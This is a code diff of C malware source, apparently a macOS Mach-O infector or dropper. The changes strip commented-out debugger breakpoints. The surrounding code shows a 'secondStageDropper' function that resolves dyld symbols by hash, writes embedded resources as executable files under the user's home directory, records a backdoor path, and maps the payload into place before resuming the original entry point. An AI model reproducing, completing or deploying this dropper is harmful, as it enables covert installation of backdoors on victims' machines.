@@ -224,8 +224,6 @@ findSymbolInFatBinary (byte *imageBase, unsigned int symbolHash)
 unsigned int
 findSymbol (byte *imageBase, unsigned int symbolHash)
 {
-  //__asm__ __volatile__ { int 0x3 }
-
   struct mach_header *mh_header       = NULL;
   struct load_command *l_command      = NULL; 
   struct nlist *sym_nlist             = NULL; 
@@ -411,8 +409,6 @@ void *mapLibSystem()
     push eax
     int 0x80
     mov [address], eax
-    //mov ecx, [ebp+0x4] // restore frame pointer - XXX: Fix this
-    //mov [ebp+0x4], ecx 
   }
 #else
   __asm__ __volatile__ (
@@ -612,7 +608,6 @@ void secondStageDropper ()
   // If not found, jump directly to the original EP
   //
   //dlsymAddress = findSymbol ((byte *)DYLD_IMAGE_BASE, dlsymHash);
-  //__asm__ __volatile__ { int 0x3 }
   _idyld_image_count = (uint32_t (__cdecl*)(void))(findSymbol ((byte *)DYLD_IMAGE_BASE, dyld_image_countHash));
 
   if ((int)_idyld_image_count != -1)
@@ -702,7 +697,6 @@ void secondStageDropper ()
               char *destinationPath = (char *) imalloc (256);
               destinationDir  = (char *) imalloc (128);
               
-              //__asm__ __volatile__ { int 0x3 }
               resource = (resourceHeader *)offset;
               
               isprintf (destinationDir, strings[1], userHome, resource->path);
@@ -715,16 +709,13 @@ void secondStageDropper ()
                   istrncpy (backdoorPath, destinationPath, 256);
                 }
               
-              //__asm__ __volatile__ { int 0x3 }
               if ((fd = iopen (destinationPath, O_RDWR | O_CREAT | O_TRUNC, 0755)) >= 0)
                 {
                   int resSize = resource->size;
 
-                  //__asm__ __volatile__ { int 0x3 }
                   if ((int)(filePointer = (char *)immap (0, resSize, PROT_READ | PROT_WRITE,
                                                          MAP_SHARED, fd, 0)) != -1)
                     {
-                      //__asm__ __volatile__ { int 0x3 }
                       if (ipwrite (fd, strings[3], 1, resource->size - 1) == -1)
                         {
                           iclose (fd);
@@ -732,8 +723,6 @@ void secondStageDropper ()
                         }
                       
                       offset += sizeof (resourceHeader);
-                      
-                      //__asm__ __volatile__ { int 0x3 }
 
                       imemcpy (filePointer,
                                (byte *)offset,
@@ -764,7 +753,6 @@ void secondStageDropper ()
             }
           else if (pid < 0)
             {
-              //__asm__ __volatile__ ("int $0x3\n");
               //doExit ();
             }
           
